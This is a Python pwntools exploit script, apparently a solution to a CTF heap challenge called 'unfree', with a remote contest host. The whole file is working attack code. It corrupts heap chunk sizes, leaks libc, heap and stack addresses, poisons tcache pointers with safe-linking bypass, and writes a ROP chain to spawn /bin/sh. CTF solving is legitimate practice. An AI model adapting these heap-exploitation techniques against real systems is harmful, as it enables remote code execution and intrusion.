#!/usr/bin/python3

from pwn import *

exe = ELF('unfree_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1506

        c
        ''')
        input()


if args.REMOTE:
    p = remote('unfree.ctfz.zone', 17171)
else:
    p = process(exe.path)
GDB()
def add(idx, sz, pa):
    sla(b"Exit", b'1')
    sla(b"add", str(idx))
    sla(b"size", str(sz))
    sa(b"data", pa)
def edit(idx, pa):
    sla(b"Exit", b'2')
    sla(b"edit", str(idx))
    sa(b"data", (pa))
def read(idx):
    sla(b"Exit", b'3')
    sla(b"read", str(idx))
add(0, 0x10, b'wan')
edit(0, b'wan'.ljust(0x10) + flat(0, 0xd51))
add(1, 0x4f0, b'a')
add(2, 0x300, b'a')
add(3, 0x550, b'a')
add(4, 0x510, b'\x01')
add(5, 0x510, b'\x01')
add(6, 0x500, b'\x01')
read(4)
libcc= (p.recvline(keepends=False))
libc.address = u64(p.recv(6)+b'\0\0') - 0x203b01
print(hex(libc.address))

edit(6, b'a'.ljust(0x500) + flat(0, 0x71)) 
add(7, 0x4f0, b'a')
add(8, 0x4f0, b'a')
add(9, 0x588, b'a')
edit(9, b'a'.ljust(0x588) + flat(0x71)) 
add(10, 0x4f0, b'a')
add(11, 0x4f0, b'a')
add(12, 0x588, b'a')
edit(6, b'a'*(0x500+0x10))
read(6)
p.recvuntil(b'a'*(0x500+0x10))
heap = (u64(p.recvline()[:-1].ljust(8, b'\0')) << 12) - 0x21000
info("heap: " + hex(heap))

edit(9, b'b'*(0x580) + flat(0, 0x51, (libc.sym.environ-0x18) ^ (heap+0x43fa0 >> 12)
     ))
add(13, 0x40, b'wan')
add(14, 0x40, b'a'*0x18)
read(14)
p.recvuntil(b'a'*0x18)
stack = u64(p.recvline()[:-1] + b'\0\0')
info("stack " + hex(stack))
target = stack - 0x160

edit(12, b'a'*(0x580) + flat(0, 0x71))
add(15, 0x4f0, b'a')
add(16, 0x4f0, b'a')
add(17, 0x588, b'a')
edit(17, b'a'*(0x580) + flat(0, 0x71))
add(18, 0x4f0, b'a')
add(19, 0x4f0, b'a')
add(20, 0x588, b'a')
edit(17, b'a'*(0x580) + flat(0, 0x51,
                                 (target-8) ^ (heap+0x87fa0 >> 12)))
add(21, 0x40, b'wan')
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
add(22, 0x40, b'a'*8 + p64(rop.find_gadget(['ret'])[0]) + bytes(rop))
p.interactive()
